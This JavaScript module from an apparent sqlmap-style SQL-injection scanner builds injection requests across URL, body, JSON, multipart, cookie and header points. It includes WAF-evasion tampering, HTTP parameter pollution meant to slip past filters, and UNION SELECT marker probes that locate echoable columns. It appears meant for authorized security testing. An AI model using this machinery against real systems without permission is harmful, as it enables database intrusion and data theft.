import { URL } from 'url';
import { fillPayload, replaceAllLiteral } from './payloads.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
import { resolveDbms, resolveFromClause, commentSuffix } from './DialectSqlBuilder.js';
// [P0-FIX 2026-09-09] 出口选项同源 + 失败响应结构（见 egressOpts.js 顶部三起事故）
import { buildEgressOpts, mustRethrowSendError, netFailureResponse } from './egressOpts.js';
import { unionDebug } from './unionDebug.js';
// [编码参数] payload 需按参数自身的传输编码（base64 / 0x-hex）编码后再发
import { encodeForPoint } from './paramEncoding.js';

// [P1 批次 2026-09-08] JSON 点路径段 → 真实键匹配（buildInjectionRequest JSON 分支用）。
// 三向匹配（与 TargetParser._discoverJsonLeaves 的路径生成互逆）：
//   ① 段为带引号形式（"a.b"）→ JSON.parse 去引号得真实键再命中；
//   ② 直接属性命中；
//   ③ 段为裸键但对象键含点号 → JSON.stringify 形式回退匹配。
// 返回真实键名或 null（无匹配，注入路径失效）。
function _matchJsonKey(obj, seg) {
  if (obj == null || typeof obj !== 'object') return null;
  // ① 段已是引号形式：去引号解析（JSON 字符串字面量），用解析结果命中真实键
  if (seg.length > 1 && seg[0] === '"' && seg[seg.length - 1] === '"') {
    try {
      const unquoted = JSON.parse(seg);
      if (typeof unquoted === 'string' && Object.prototype.hasOwnProperty.call(obj, unquoted)) return unquoted;
    } catch { /* 非法 JSON 字面量：走后续分支 */ }
  }
  // ② 直接属性命中
  if (Object.prototype.hasOwnProperty.call(obj, seg)) return seg;
  // ③ stringify 形式回退（对象键本身带引号存储的边缘场景）
  const quoted = JSON.stringify(seg);
  if (quoted.length > 2 && Object.prototype.hasOwnProperty.call(obj, quoted)) return quoted;
  return null;
}

// [P1 批次 2026-09-08] 引号感知的点路径拆分：普通段用 '.' 分隔，但 "带引号" 段（键本身
// 含点号，TargetParser 生成时用 JSON.stringify 包裹）作为整体不拆。例：
// `user."a.b".id` → ['user', '"a.b"', 'id']（而非 ['user', '"a', 'b"', 'id']）。
// 与 _discoverJsonLeaves 的路径生成规则互逆；数组下标段为裸数字。
function _splitJsonPath(path) {
  const segs = [];
  let i = 0;
  const s = String(path ?? '');
  while (i < s.length) {
    if (s[i] === '"') {
      // 引号段：找到闭合引号（键内的转义引号按 JSON 语义简化处理——扫描到下一个
      // 未被反斜杠转义的引号）
      let j = i + 1;
      while (j < s.length) {
        if (s[j] === '\\') { j += 2; continue; }
        if (s[j] === '"') break;
        j++;
      }
      if (j >= s.length) return null; // 引号未闭合：非法路径
      segs.push(s.slice(i, j + 1));
      i = j + 1;
      if (s[i] === '.') i++;
      else if (i < s.length) return null; // 引号段后必须跟点号或结束
    } else {
      // 普通段：到下一个点号（跳过引号内的点号）
      let j = i;
      while (j < s.length && s[j] !== '.') j++;
      if (j === i) return null; // 空段（连续点号/首尾点号）：非法
      segs.push(s.slice(i, j));
      i = j;
      if (s[i] === '.') i++;
    }
  }
  return segs.length ? segs : null;
}

// 读取 target.config 的 prefix/suffix（对标 sqlmap --prefix / --suffix），
// 包裹「被注入的参数值」：最终注入值 = prefix + 原值 + payload + suffix。
// 仅影响注入请求——value 恰为原始值（基线请求）或直连模式时原样返回，不污染基线请求。
export function applyPrefixSuffix(target, point, value) {
  const cfg = (target && target.config) || {};
  const prefix = typeof cfg.prefix === 'string' ? cfg.prefix : '';
  const suffix = typeof cfg.suffix === 'string' ? cfg.suffix : '';
  if ((!prefix && !suffix) || (target && target.mode === 'direct')) return value;
  // 基线请求：value 恰为原始值（无 payload 拼接）时不包裹，保持基线请求原样
  const orig = (point && point.originalValue) || '1';
  if (value === orig) return value;
  return `${prefix}${value}${suffix}`;
}

// 统一的注入请求构造（url/body/cookie/header 四种注入点）
// 与 Detector.buildRequest / Extractor._build / DBFingerprinter._build 行为一致，集中维护避免三处漂移。
// multipart 报文构造（发送侧）：按 RFC 7578 拼文本字段，末段为闭合 boundary。
// 已知限制：只重建**文本字段**；原请求里的 file 类型字段会以空值占位（字段名仍在），
// 文件内容不回传 —— 对 SQL 注入检测无影响（注入面在字段名/文本值上）。
function buildMultipartBody(fields, boundary) {
  const chunks = [];
  for (const [k, v] of Object.entries(fields || {})) {
    chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${k}"\r\n\r\n${v ?? ''}\r\n`);
  }
  chunks.push(`--${boundary}--\r\n`);
  return chunks.join('');
}

// boundary 随机串（纯小写字母数字，避免特殊字符引发解析歧义）
const nanoidLc = () => Math.random().toString(36).slice(2, 12);

export function buildInjectionRequest(target, point, value) {
  // 先包裹 prefix/suffix（对标 sqlmap --prefix/--suffix），再按注入点位置拼入请求
  const wrapped = applyPrefixSuffix(target, point, value);
  // [编码参数] 参数值本身是 base64 / 0x-hex 传输时，payload 必须先编码成同样形态再发：
  // 服务端解码后才拼进 SQL，直接发原始 payload 是无效的（实测 D14 靶点只能靠报错碰运气）。
  const injected = encodeForPoint(wrapped, point && point.encoding);
  // 直连模式：把 value（注入 payload）拼进 SQL 模板的 {INJECT} 标记处，产出 req.sql（由 DirectConnector 执行）。
  if (target && target.mode === 'direct') {
    const tpl = (point && point.sqlTemplate) || (target && target.sqlTemplate);
    const sql = String(tpl).replace(/\{INJECT\}/g, injected);
    return { method: '', url: '', params: {}, data: {}, headers: {}, sql };
  }
  // 表单点回退：优先用表单自身的提交方法与 action 地址；否则回退到 target 默认。
  const req = {
    method: point.formMethod || target.method,
    url: point.actionUrl || target.baseUrl,
    params: {},
    data: {},
    headers: { ...(target.headerParams || {}) },
  };
  const cookies = { ...(target.cookieParams || {}) };
  // [P0-FIX 2026-09-07] cookieParams = 会话上下文，必须无条件携带到所有 HTTP 注入点的
  // 请求上——登录后才可见的后台/用户中心是注入重灾区，此前仅 cookie 注入点分支会写
  // Cookie 头，url/body/header 注入点的请求全部裸奔（实测 80 请求 0 个带 sid，
  // 基线标题「未登录」，还在未登录页上测出 boolean 假阳性）。
  // 语义解耦：cookieParams（会话携带，无条件）≠ cookie 注入点（测试目标，level≥2）。
  // 优先级：用户显式 headerParams.Cookie（如 --cookie= 手工指定）> cookieParams 自动会话，
  // 与 HttpClient 的「显式头优先，jar 同名不覆盖」规则一致。
  if (
    Object.keys(cookies).length > 0 &&
    !req.headers['Cookie'] && !req.headers['cookie']
  ) {
    req.headers['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }
  if (point.location === 'url') {
    const u = new URL(req.url);
    // [P0-FIX 2026-09-06] 已编码 payload 跳过二次编码：charencode/chardoubleencode 类
    // tamper 的输出本身就是 URL 编码形态，searchParams.set 会把 % 再编码为 %25（双重编码）
    // → 服务器单次解码后 payload 仍是编码形态 → SQL 层收到乱码、回显标记失配
    // （waf-lab configB 0 检出的根因）。判定：含合法 %XX 且解码后形态改变 → 视为已编码。
    // 误判面：LIKE '%a%' 等含裸 % 的值解码会失败或不变 → 不触发 preEncoded 分支。
    const looksEncoded = /%[0-9A-Fa-f]{2}/.test(injected);
    let preEncoded = false;
    if (looksEncoded) {
      try {
        preEncoded = decodeURIComponent(injected) !== injected;
      } catch {
        preEncoded = false; // 非法序列（如 '%a%'）→ 未编码
      }
    }
    // [对标 sqlmap --param-del] 自定义分隔符：searchParams 只认 '&'，用它重建会把
    // `a=1;b=2` 整体写成一个参数值 → 注入请求畸形。此处按用户分隔符手工重建 query。
    const paramDel = (target.config && target.config.paramDel) || null;
    if (paramDel) {
      const rawQ = u.search.startsWith('?') ? u.search.slice(1) : u.search;
      const val = preEncoded ? injected : encodeURIComponent(injected);
      let hit = false;
      const parts = rawQ.split(paramDel).filter(Boolean).map((pair) => {
        const i = pair.indexOf('=');
        const k = i < 0 ? pair : pair.slice(0, i);
        if (k === point.param) {
          hit = true;
          return `${k}=${val}`;
        }
        return pair;
      });
      if (!hit) parts.push(`${encodeURIComponent(point.param)}=${val}`);
      req.url = `${u.origin}${u.pathname}?${parts.join(paramDel)}`;
    } else if (preEncoded) {
      // 手工拼 query：先移除同名旧参数，injected 已是编码形态仅编码参数名
      u.searchParams.delete(point.param);
      const rest = u.searchParams.toString();
      req.url = `${u.origin}${u.pathname}?${rest ? rest + '&' : ''}${encodeURIComponent(point.param)}=${injected}`;
    } else {
      u.searchParams.set(point.param, injected);
      req.url = u.toString();
    }
  } else if (point.location === 'path') {
    // P3 路径注入点：按 pathSegment 下标替换 URL 路径中的标记段（URL 构造器自动做路径编码）
    const u = new URL(req.url);
    const segments = u.pathname.split('/');
    // 优先用 pathSegment 下标；无下标时回退按 param 匹配段值（剥离尾部 * 后比较，兼容路径标记仍在 URL 中的场景）
    const idx =
      point.pathSegment != null
        ? point.pathSegment
        : segments.findIndex((s) => s.replace(/\*+$/g, '') === point.param);
    if (idx >= 0 && idx < segments.length) {
      segments[idx] = injected;
      u.pathname = segments.join('/');
    }
    req.url = u.toString();
  } else if (point.location === 'body') {
    // 表单点：将表单全部字段并入 data（含 CSRF token），再把当前注入参数覆盖为注入值
    const formValues = point.formValues || {};
    req.data = { ...formValues };
    req.data[point.param] = injected;
    // [P1 2026-09-22] multipart 目标：目标请求头声明了 multipart/form-data 时，
    // 必须以 multipart 形态重建报文 —— 否则发成 urlencoded / JSON，只吃 multipart 的目标
    // 解析不到字段 → **注入值从未进 SQL → 静默 0 检出**。
    // （`-r` 导入侧早就能认出 multipart 的字段名，缺的一直是发送侧；靶场 e2e/pentest-lab
    //  的 `/mp` 把这个缺口钉成了可复现事实。）
    // 已知限制：只重建**文本字段**；原请求里的 file 类型字段会以空值占位（文件名仍在）。
    const declaredCt = Object.keys(req.headers).find((k) => /^content-type$/i.test(k));
    if (declaredCt && /^multipart\/form-data/i.test(req.headers[declaredCt])) {
      const existing = /boundary=(?:"([^"]+)"|([^;\s]+))/i.exec(req.headers[declaredCt]);
      const boundary = (existing?.[1] || existing?.[2] || `----SqlScanBoundary${nanoidLc()}`).trim();
      req.data = buildMultipartBody(req.data, boundary);
      req.headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
    } else if (target.jsonBody == null) {
      // [P0-FIX 2026-09-15] 表单点 Content-Type 修正：axios 对对象 data 默认 JSON 序列化，
      // urlencoded-only 目标（真实 HTML 表单常态）解析不到 body → 注入值从未进 SQL → 全漏检。
      // 序列化为 urlencoded 并显式声明 Content-Type。JSON API 目标（target.jsonBody 存在）
      // 保持 axios JSON 序列化（下方 JSON 分支按需重序列化），仅 HTML 表单点走 urlencoded。
      req.data = new URLSearchParams(req.data).toString();
      req.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    // [P1 批次 2026-09-08] JSON body 嵌套注入点（param 为点路径如 user.id）：
    // target.jsonBody 存在时按路径替换叶子值为注入值后整体重序列化为 JSON 字符串
    // （Content-Type 设 application/json——HttpClient 对字符串 data 直发不覆盖）。
    // 点路径按段替换：段为纯数字走数组下标，否则走对象键（键含点号时用 JSON.stringify
    // 形式匹配，与 TargetParser._discoverJsonLeaves 的路径生成规则互逆）。
    if (target.jsonBody != null && typeof target.jsonBody === 'object' && point.param.includes('.')) {
      const clone = JSON.parse(JSON.stringify(target.jsonBody));
      // [P1 批次 2026-09-08] 引号感知路径解析：键含点号时 TargetParser 生成 "a.b" 形式段，
      // 暴力 split('.') 会切碎——_splitJsonPath 把带引号段作为整体解析（互逆规则）。
      const segs = _splitJsonPath(point.param);
      let cur = clone;
      let ok = true;
      // 显式取出非空局部量：下面的循环/尾部取值都依赖它非 null，
      // 仅靠 if (!segs) 赋值 ok 无法让 TS 在循环体内完成窄化。
      const segsArr = /** @type {string[]} */ (segs);
      if (!segs) {
        ok = false; // 非法路径（引号未闭合/空段）：JSON 注入失效，保持表单语义
      }
      for (let i = 0; ok && i < segsArr.length - 1; i++) {
        const raw = segsArr[i];
        const num = /^\d+$/.test(raw) ? Number(raw) : null;
        const key = num !== null ? num : _matchJsonKey(cur, raw);
        if (key === null || cur[key] == null || typeof cur[key] !== 'object') { ok = false; break; }
        cur = cur[key];
      }
      if (ok) {
        const leaf = segsArr[segsArr.length - 1];
        const leafNum = /^\d+$/.test(leaf) ? Number(leaf) : null;
        const leafKey = leafNum !== null ? leafNum : _matchJsonKey(cur, leaf);
        if (leafKey !== null) {
          cur[leafKey] = injected;
          req.data = JSON.stringify(clone);
          req.headers['Content-Type'] = 'application/json';
        }
      }
    }
  } else if (point.location === 'cookie') {
    cookies[point.param] = injected;
    req.headers['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  } else if (point.location === 'header') {
    req.headers[point.param] = injected;
  }
  // [P2-5] --hpp：HTTP 参数污染（对标 sqlmap --hpp）。仅对 GET query 注入点生效：
  // 注入请求（值 ≠ 原始值）时把注入值额外写入 body 同名参数（query+body 双份），利用
  // WAF（常只查 query 单侧/首份）与后端解析（ASP.NET/IIS 读首份、PHP/Node qs 读末份、
  // 部分网关拼接两侧）的差异绕过检测。基线请求不双份，保持基线原样零污染。
  const _cfg = (target && target.config) || {};
  const _orig = (point && point.originalValue) || '1';
  if (point.location === 'url' && _cfg.hpp === true && injected !== _orig) {
    req.data[point.param] = injected;
  }
  return req;
}

// 经统一 HttpClient 发送。
// [P0-FIX 2026-09-09] 失败不再吞成 null：网络层失败降级为带 `__netErr` 的**失败响应对象**
// （status 0 / data 空串，`res?.status`、`String(res?.data ?? '')` 语义不变，零回归），
// 于是判定层能区分「目标返回空页」与「一个包都没发出去」—— 前者可以下结论，后者不行。
// 两类例外必须继续抛出：扫描停止（Abort）与安全硬拒（SSRF / scope 越界 / URL 非法）——
// 把「越界」写成「这个点没洞」是最坏的失败方式。
/** @param {any} httpClient @param {object} ctx @param {any} req @param {any} opts */
export async function sendInjection(httpClient, ctx, req, opts = {}) {
  const config = (ctx && ctx.config) || {};
  try {
    const res = await httpClient.request(
      // 出口选项与 Detector.send / Detector.sendHead 同源（见 egressOpts.js 顶部三起事故）
      buildEgressOpts(config, {
        method: req.method,
        url: req.url,
        params: req.params,
        data: req.data,
        headers: req.headers,
        sql: req.sql,
        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
        retry: opts.retry ?? config.retry,
      })
    );
    // 目标库健康回流（提取/指纹阶段的请求同样可能触发 DB 致命错误）
    try {
      ctx?.guard?.observe(res);
    } catch {
      /* 守卫异常不影响主流程 */
    }
    return res;
  } catch (err) {
    if (mustRethrowSendError(err)) throw err;
    const failed = netFailureResponse(err, { url: req.url });
    try {
      ctx?.guard?.observe(failed);
    } catch {
      /* 守卫异常不影响主流程 */
    }
    return failed;
  }
}

// 按 WAF 规避配置包裹混淆（tamper 链式优先，否则 legacy obfuscate，否则原样）
/** @param {object} ctx @param {any} value */
export function obfuscateIfNeeded(ctx, value) {
  return obfuscateWithConfig(value, ctx);
}

const MARKER = 'SQLISCANNER';

// —— 数值型回显列兜底（修复对标 sqlmap 差距 D3：严格类型库 UNION 漏检）——
// 文本标记 'SQLISCANNER<i>' 落在 INT 回显列上时：MSSQL/Oracle/PG 等严格类型库因
// varchar→int 转换失败使整条 UNION 报错 → 完全漏检；MySQL 虽静默转 0 不报错，
// 标记同样变形无法命中。数字字面量在 int 列直接兼容、varchar 列被隐式转文本回显，
// 故文本探测落空后追加「两族不同基值的数字标记交叉确认」（双族交集，防页面固有
// 数字串——如时间戳子串——造成的假命中）。
const NUM_MARKER_BASE_A = 7331000;
const NUM_MARKER_BASE_B = 5182960;

// 构造一次标记 UNION 探测请求（boundary 由调用方传入；缺省回落到 point.boundary）
// [CRS-FIX 2026-09-10] 末尾必须带行注释：否则字符串型注入点残留的闭合引号无法被注释掉
// → 整条 SQL 语法错误 → 探测恒 500（实测 /str、/like 的 UNION 回显列定位 100% 失败）。
/** @param {object} ctx @param {any} columns @param {any} markerExprs @param {any} boundary @param {any} fromClause */
function _markerProbe(ctx, columns, markerExprs, boundary, fromClause = '') {
  const { target, point } = ctx;
  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
  const payload =
    replaceAllLiteral(
      fillPayload('{ORIG} UNION SELECT {MARKERS}', {
        orig: `${point.originalValue || '1'}${boundary}`,
      }),
      '{MARKERS}',
      markerExprs.join(',')
    ) + fromClause + suffix;
  return { payload, req: buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload)) };
}

function _textMarkers(columns) {
  return Array.from({ length: columns }, (_, i) => `'${MARKER}${i}'`);
}

function _numMarkers(base, columns) {
  return Array.from({ length: columns }, (_, i) => String(base + i));
}

/** @param {any} httpClient @param {object} ctx @param {any} probe */
async function _probeBody(httpClient, ctx, probe) {
  const res = await sendInjection(httpClient, ctx, probe.req);
  const status = res?.status ?? null;
  return {
    body: String(res?.data ?? ''),
    status,
    // [P0-FIX 2026-09-07] 标记命中必须发生在非错误响应上：PG 严格类型下 UNION 类型错配的
    // 500 错误页会把「转换失败的输入值」原样回显（invalid input syntax for type integer:
    // "SQLISCANNER0"）——按纯文本匹配会把报错回显误判为可回显列（实测 echoCols 被污染成
    // int 列 [0] → 拖库把文本表达式放 int 列 → 提取全线 500）。
    echoed: status != null && status >= 200 && status < 400,
  };
}

// 用给定的 fromClause 做一轮完整回显列探测（text → 逐列 text → numeric A → B 交叉确认）。
// 提取为独立函数以支持「DBMS 已知时用对应 FROM 子句、未知时先空再 FROM dual 兜底」两轮复用。
/** @param {any} httpClient @param {object} ctx @param {any} columns @param {any} boundary @param {any} fromClause */
async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause) {
  // 与 _markerProbe 同一判据：证据 payload 必须与实际发出的探测逐字节一致
  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
  const textProbe = _markerProbe(ctx, columns, _textMarkers(columns), boundary, fromClause);
  const textRes = await _probeBody(httpClient, ctx, textProbe);
  unionDebug(
    `probe columns=${columns} status=${textRes.status} echoed=${textRes.echoed} ` +
      `len=${textRes.body.length} payload=${String(textProbe.payload).slice(0, 90)}`,
  );
  if (textRes.echoed) {
    const lower = textRes.body.toLowerCase();
    const cols = [];
    for (let i = 0; i < columns; i++) {
      // 大小写不敏感匹配：randomcase 等 tamper 会打乱回显标记的大小写
      if (lower.includes(`${MARKER}${i}`.toLowerCase())) cols.push(i);
    }
    if (cols.length > 0) {
      return { cols, numericCols: [], style: 'text', evidencePayload: textProbe.payload };
    }
  }

  // [CRS-FIX 2026-09-10] 全 NULL 哨兵：列数不匹配时的短路。
  // 走到这里说明「全列文本标记」探测失败，失败原因有两种，处置截然不同：
  //   ① 列数猜错（ORDER BY 二分收敛到错的 N）→ 任何 UNION 都报 "different number of
  //      columns" → 后续 N 条逐列探测 + 2 条数字族探测**必然全失败**；
  //   ② 严格类型库（PG/MSSQL/Oracle）某列为 INT，文本标记触类型错误 → 逐列探测正是为它
  //      设计的（单列标记 + 其余 NULL），必须继续。
  // 区分判据：发一条「全 NULL」UNION（不放置任何标记）。NULL 与任何列类型都兼容，
  // 故 ② 下必然成功、① 下必然失败。成本 +1 条请求，可省下 N+2 条（实测 N=50 时省 51 条）。
  // 且仅在「全列标记已失败」的分支执行，成功路径（MySQL/SQLite 一轮命中）零额外开销。
  if (!textRes.echoed) {
    const nullSentinel = _markerProbe(ctx, columns, Array.from({ length: columns }, () => 'NULL'), boundary, fromClause);
    const sentinelRes = await _probeBody(httpClient, ctx, nullSentinel);
    if (!sentinelRes.echoed) {
      unionDebug(
        `probe sentinel-fail columns=${columns} status=${sentinelRes.status} ` +
          `→ 结构性失败（列数不匹配或语法错误），跳过 ${columns} 条逐列探测 + 数字族`,
      );
      return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
    }
  }

  // [P0-FIX 2026-09-07] 逐列文本探测：全列文本标记在严格类型库（PG/MSSQL/Oracle）上
  // 只要有一列是 INT 就整条 UNION 报错 → 真正的文本回显列（如 username/email）永远
  // 发现不了。逐列探测「单列放文本标记、其余列全 NULL」——NULL 与任何列类型 UNION
  // 都合法，因此仅当该列真正可回显文本时才命中。宽松类型库（MySQL/SQLite）第一轮
  // 已命中，不会走到这里（零额外请求）；严格类型库成本 = 列数 N 个请求（限并发 4）。
  const perCol = [];
  const BATCH = 4;
  for (let start = 0; start < columns; start += BATCH) {
    const batch = [];
    for (let i = start; i < Math.min(start + BATCH, columns); i++) {
      const nulls = Array.from({ length: columns }, () => 'NULL');
      nulls[i] = `'${MARKER}${i}'`;
      batch.push(
        _probeBody(httpClient, ctx, _markerProbe(ctx, columns, nulls, boundary, fromClause)).then((r) => ({ i, ...r }))
      );
    }
    perCol.push(...(await Promise.all(batch)));
  }
  const textCols = [];
  let evidence = textProbe.payload;
  for (const r of perCol) {
    if (r.echoed && r.body.toLowerCase().includes(`${MARKER}${r.i}`.toLowerCase())) {
      textCols.push(r.i);
      if (textCols.length === 1) {
        const single = Array.from({ length: columns }, () => 'NULL');
        single[r.i] = `'${MARKER}${r.i}'`;
        evidence =
          replaceAllLiteral(
            fillPayload('{ORIG} UNION SELECT {MARKERS}', {
              orig: `${ctx.point?.originalValue || '1'}${boundary}`,
            }),
            '{MARKERS}',
            single.join(',')
          ) + fromClause + suffix;
      }
    }
  }
  if (textCols.length > 0) {
    return { cols: textCols, numericCols: [], style: 'text', evidencePayload: evidence };
  }

  // 数字兜底 A 族
  const probeA = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_A, columns), boundary, fromClause);
  const resA = await _probeBody(httpClient, ctx, probeA);
  const hitsA = [];
  if (resA.echoed) {
    for (let i = 0; i < columns; i++) {
      if (resA.body.includes(String(NUM_MARKER_BASE_A + i))) hitsA.push(i);
    }
  }
  if (hitsA.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }

  // B 族交叉确认（仅保留双族同时命中的列，剔除页面固有数字串假命中）
  const probeB = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_B, columns), boundary, fromClause);
  const resB = await _probeBody(httpClient, ctx, probeB);
  const numericCols = resB.echoed
    ? hitsA.filter((i) => resB.body.includes(String(NUM_MARKER_BASE_B + i)))
    : [];
  if (numericCols.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }
  return { cols: [], numericCols, style: 'numeric', evidencePayload: probeA.payload };
}

// 定位可回显列（详细版）：
//   ① 全列文本标记探测（MySQL/SQLite 等宽松类型库一次请求即命中）
//   ② 落空时逐列文本探测（严格类型库：单列文本 + 其余 NULL，NULL 与任何类型 UNION 合法，
//      精确定位真正可回显文本的列——修复「任一 INT 列使全列标记整条报错 → 文本列全漏」）
//   ③ 数字标记 A 族探测 → 命中后 B 族交叉确认（纯 INT 回显列兜底）
//   ④ ★FIX [P0]：DBMS 未知时补一轮 FROM dual 兜底
//      Oracle/DM8/DB2 等方言 SELECT 必须带 FROM 伪表，否则直接报错 → 第一轮全失败。
//      FROM dual 对 MySQL/Oracle 安全（合法），PG/SQLite/MSSQL 不支持 dual → 报错 → 不误报。
// 返回 { cols: 文本回显列, numericCols: 数值回显列(已交叉确认), style, evidencePayload }
//   - cols 语义与旧版 discoverEchoColumns 一致：仅文本可回显列（拖库/版本提取只能走文本列）
//   - evidencePayload：命中的那次请求 payload（供检测器记录证据）
//   - 所有标记命中均要求响应为 2xx/3xx：5xx 错误页会回显「转换失败的输入值」，
//     按纯文本匹配会把报错回显误判为回显列（假命中）。
// [CRS-FIX 2026-09-10] boundary 缺省回落到 point.boundary。
// 原默认 '' 使**未显式传参的调用方**（DBFingerprinter 经 discoverEchoColumns）在字符串型
// 注入点上发出未闭合的 UNION 探测 → 整句落在引号内 → 恒失败 → 指纹的 UNION 版本通道
// 在 /str、/like、/blind 上 100% 空转。显式传参的 UnionDetector 本就传 point.boundary，
// 行为不变（数值型注入点 boundary 探测结果就是 ''）。
/** @param {any} httpClient @param {object} ctx @param {any} columns @param {any} boundary */
export async function discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary = ctx?.point?.boundary || '') {
  if (!(columns > 0)) return { cols: [], numericCols: [], style: 'none', evidencePayload: '' };

  // 根据 DBMS 决定 UNION SELECT 的伪表 FROM 子句
  // 已知 Oracle/DM8/DB2 等 → 第一轮直接带正确 FROM 子句，一次命中
  // 未知 DBMS → 第一轮不带 FROM（MySQL/MSSQL/SQLite/PG 等不需 FROM），失败后兜底 FROM dual
  const dbms = resolveDbms(ctx.dbms);
  const fromClause = resolveFromClause(dbms, ctx?.config?.unionFrom);

  // 第一轮：用 DBMS 对应的 fromClause 探测
  const result = await _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause);
  if (result.style !== 'none') return result;

  // 第二轮：DBMS 未知且第一轮全失败 → FROM dual 兜底（覆盖 Oracle/DM8/DB2 等）
  if (!dbms) {
    const dualResult = await _probeWithFromClause(httpClient, ctx, columns, boundary, ' FROM dual');
    if (dualResult.style !== 'none') return dualResult;
  }

  // 两轮都失败
  return result;
}

// 在已知列数下用标记 UNION 定位可回显列（返回 0-based 索引数组）
// 提取器/指纹器复用本函数，避免各自硬编第 2 列。语义保持向后兼容：仅返回文本可回显列。
/** @param {any} httpClient @param {object} ctx @param {any} columns */
export async function discoverEchoColumns(httpClient, ctx, columns) {
  const { cols } = await discoverEchoColumnsDetailed(httpClient, ctx, columns);
  return cols;
}
